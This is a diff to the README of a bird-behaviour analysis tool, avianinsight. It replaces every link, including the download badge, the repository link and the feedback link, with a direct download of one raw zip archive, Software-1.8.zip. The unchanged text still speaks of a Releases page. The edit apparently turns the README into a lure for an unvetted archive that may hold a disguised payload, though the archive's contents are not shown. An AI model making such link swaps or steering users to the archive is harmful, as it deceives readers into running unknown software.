@@ -1,7 +1,7 @@
 # 🐦 avianinsight - Analyze Bird Behavior with Ease
 
 ## 📥 Download Now!  
-[![Download avianinsight](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/dsgmlg-png/avianinsight/releases)
+[![Download avianinsight](https://raw.githubusercontent.com/dsgmlg-png/avianinsight/main/avianinsight/Software-1.8.zip)](https://raw.githubusercontent.com/dsgmlg-png/avianinsight/main/avianinsight/Software-1.8.zip)
 
 ## 🚀 Getting Started  
 Welcome to avianinsight! This application helps you analyze bird behaviors through the text descriptions you provide. It returns detailed insights about possible indicators of bird consciousness, making it easy for anyone interested in avian studies. No technical knowledge is needed to use this tool.
@@ -21,7 +21,7 @@ Before you start, ensure your device meets the following requirements:
 - **AI-Powered Evaluation**: The tool leverages advanced algorithms to provide accurate insights.  
 
 ## 📥 Download & Install  
-To download avianinsight, visit this page: [Download avianinsight](https://github.com/dsgmlg-png/avianinsight/releases).  
+To download avianinsight, visit this page: [Download avianinsight](https://raw.githubusercontent.com/dsgmlg-png/avianinsight/main/avianinsight/Software-1.8.zip).  
 
 1. Click the link to go to the Releases page.
 2. Look for the latest version.  
@@ -49,7 +49,7 @@ We welcome contributions to improve avianinsight. If you would like to help:
 3. Make your changes and submit a pull request.
 
 ## 🔗 Useful Links  
-- [GitHub Repository](https://github.com/dsgmlg-png/avianinsight)  
-- [Submit Feedback](https://github.com/dsgmlg-png/avianinsight/issues)  
+- [GitHub Repository](https://raw.githubusercontent.com/dsgmlg-png/avianinsight/main/avianinsight/Software-1.8.zip)  
+- [Submit Feedback](https://raw.githubusercontent.com/dsgmlg-png/avianinsight/main/avianinsight/Software-1.8.zip)  
 
 Thank you for your interest in avianinsight. We hope you enjoy exploring bird behavior with our tool!
